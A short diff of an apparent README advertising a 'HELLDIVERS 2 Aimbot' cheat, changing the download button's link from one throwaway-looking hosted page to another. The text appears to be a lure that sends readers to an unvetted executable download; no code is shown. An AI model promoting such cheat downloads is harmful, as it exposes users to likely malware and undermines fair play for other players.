@@ -4,7 +4,7 @@
 
 Whether you're in the heat of Helldive mode or farming XP solo, this is how you hit every headshot, every time — no excuses.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload18.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://HELLDIVERS-2-Aimbot-lem.github.io/.github)
 ---
 
 ## 🎮 What Is a HELLDIVERS 2 Aimbot?
